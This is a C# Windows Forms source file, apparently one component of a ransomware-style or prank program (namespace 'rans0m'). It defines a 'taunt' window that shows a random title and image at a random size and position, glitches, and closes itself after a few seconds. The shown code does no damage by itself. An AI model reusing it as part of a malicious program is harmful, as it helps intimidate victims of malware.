namespace rans0m
{
    public partial class TauntWindow : Form
    {
        public TauntWindow()
        {
            InitializeComponent();
        }

        private void TauntWindow_Load(object sender, EventArgs e)
        {
            try
            {
                Text = Global.tauntTitles[Global.RngNext(Global.tauntTitles.Count)];
                BackgroundImage = Global.tauntImages[Global.RngNext(Global.tauntImages.Count)];
                int w = Global.RngNext(200, 400);
                int h = Global.RngNext(200, 400);
                Size = new Size(w, h);
                MaximumSize = Size;
                MinimumSize = Size;
            }
            catch { }

            Global.RandomPosControl(this);

            _ = Task.Run(() => Global.GlitchIdle(this));

            _ = Task.Run(async () =>
            {
                try { await Task.Delay(Global.RngNext(4000, 10 * 1000)); } catch { }
                if (IsDisposed || !IsHandleCreated) return;
                try { this.Invoke(() => { if (!IsDisposed) Dispose(); }); } catch { }
            });
        }
    }
}
